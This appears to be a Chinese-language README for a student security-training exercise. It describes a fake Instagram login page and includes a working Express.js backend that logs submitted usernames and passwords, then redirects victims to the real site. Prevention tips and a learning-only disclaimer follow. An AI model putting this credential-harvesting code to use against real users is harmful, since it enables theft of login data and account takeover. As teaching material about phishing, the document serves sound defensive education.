# 釣魚網站教材

知資為資知 - 2024中電會聯合寒訓

By [毛哥EM](https://github.com/Edit-Mr)

對於釣魚網站（Phishing）來說，它們通常是為了欺騙用戶輸入他們的敏感信息，如用戶名和密碼。在這個例子中，我構建了一個後端伺服器來收集用戶的登入數據並將其重定向到 Instagram 的真實網站。這是一種非常常見的釣魚攻擊手法。

![](demo.gif)

## 如何運行
確保你已經安裝了 Node.js。下載或克隆此存儲庫。

```bash
npm install express
node app.js
```

在瀏覽器中訪問 <http://localhost:3000>。

## 技術原理

1. **前端偽裝**：
   - 我們創建了一個模仿 Instagram 登入頁面的 HTML 表單。
   - 用戶在這個偽造的頁面上輸入他們的用戶名和密碼。

2. **後端伺服器**：
   - 使用 Express.js 來處理 HTTP 請求。
   - 使用 `body-parser` 來解析表單數據。
   - 當用戶提交表單時，伺服器會接收並記錄這些提交的數據（如用戶名和密碼）。
   - 然後，伺服器將用戶重定向到 Instagram 的真實網站，讓用戶認為他們只是輸錯密碼，其實密碼已經被我們盜取。

### 如何預防釣魚網站

1. **檢查 URL**：
   - 確認網頁地址是否正確。釣魚網站通常會使用與真實網站非常相似的域名，但會有細微差異。

2. **HTTPS**：
   - 檢查網站是否使用 HTTPS。大多數合法網站都會使用 SSL/TLS 加密來保護用戶數據。
   - 雖然 HTTPS 不一定能保護你免受釣魚攻擊，但沒有 HTTPS 的網站應該被視為高風險。

3. **防範電子郵件釣魚**：
   - 小心處理電子郵件中的連結和附件。不要輕易點擊不明來源的連結。
   - 合法公司通常不會通過電子郵件要求用戶提供敏感信息。

4. **雙重身份驗證（2FA）**：
   - 啟用雙重身份驗證，即使密碼被盜，攻擊者也很難登入你的帳戶。

5. **反釣魚工具**：
   - 使用現代瀏覽器中的反釣魚過濾器。
   - 安裝反釣魚軟件或插件，這些工具可以幫助檢測和阻止釣魚網站。

6. **教育和意識**：
   - 增加對釣魚攻擊的認識。經常參加網絡安全培訓，了解最新的釣魚技巧和防禦措施。

### 代碼示範

這是一個基本的釣魚網站後端，以下是重點部分的解釋：

```javascript
const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const port = 3000;

// Use body-parser middleware to parse form data
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files from the 'static' folder
app.use(express.static('src'))

// Handle form submission
app.post('/login', (req, res) => {
    // Log received login data
    console.log('Received login data:', req.body);
    // redirect to https://www.instagram.com/
    res.redirect('https://www.instagram.com/');
});

// redirect GET /login to GET /
app.get('/login', (req, res) => {
    res.redirect('/');
});

// Start the server
app.listen(port, () => {
    console.log(`Server is running at http://localhost:${port}`);
});
```

1. 使用 `express` 建立伺服器。
2. 使用 `body-parser` 解析表單數據。
3. 伺服器接收 `/login` 路徑的 POST 請求，並記錄用戶提交的數據。
4. 然後將用戶重定向到 Instagram 的真實網站。

這樣的釣魚網站非常危險，因為用戶可能不會注意到他們的數據已經被盜取。因此，了解和預防這類攻擊對於保護個人信息至關重要。

## 資安宣導

此倉庫僅供學習用途，請勿用於非法用途，否則後果自負。
